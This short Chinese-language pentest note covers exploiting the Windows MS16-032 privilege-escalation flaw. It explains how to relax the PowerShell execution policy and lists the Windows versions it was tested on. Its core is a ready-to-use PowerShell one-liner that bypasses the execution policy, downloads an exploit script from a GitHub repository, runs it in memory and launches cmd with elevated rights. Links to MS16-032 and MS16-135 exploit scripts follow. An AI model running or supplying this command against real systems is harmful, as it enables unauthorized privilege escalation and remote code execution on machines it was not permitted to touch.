MS16-032

可能会遇到问题无法加载文件 ******.ps1，因为在此系统中禁止执行脚本。
执行
set-executionpolicy remotesigned
选择Y即可。
支持机器Win7-Win10 & 2k8-2k12
测试于 x32 Win7, x64 Win8, x64 2k12R2

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c whoami /add'"

https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Invoke-MS16-032.ps1



https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Invoke-MS16-135.ps1
